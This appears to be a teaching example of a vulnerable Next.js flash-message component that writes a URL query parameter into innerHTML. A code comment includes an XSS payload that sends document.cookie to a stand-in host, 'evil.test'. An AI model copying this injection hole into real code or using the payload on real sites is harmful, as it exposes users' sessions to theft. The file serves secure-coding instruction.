// VULNERABLE EXAMPLE - do not copy into production code.
// app/components/flash-message.tsx (Next.js client component)

'use client';

import { useSearchParams } from 'next/navigation';
import { useEffect, useRef } from 'react';

// Shows ?message=... after a redirect, e.g. /dashboard?message=Saved
export function FlashMessage() {
  const params = useSearchParams();
  const box = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const message = params.get('message');
    // innerHTML parses the text as HTML. A link such as
    // /dashboard?message=<img src=x onerror=fetch('//evil.test/'+document.cookie)>
    // runs script in the victim's session.
    if (box.current && message) box.current.innerHTML = `<strong>${message}</strong>`;
  }, [params]);

  return <div ref={box} role="status" />;
}
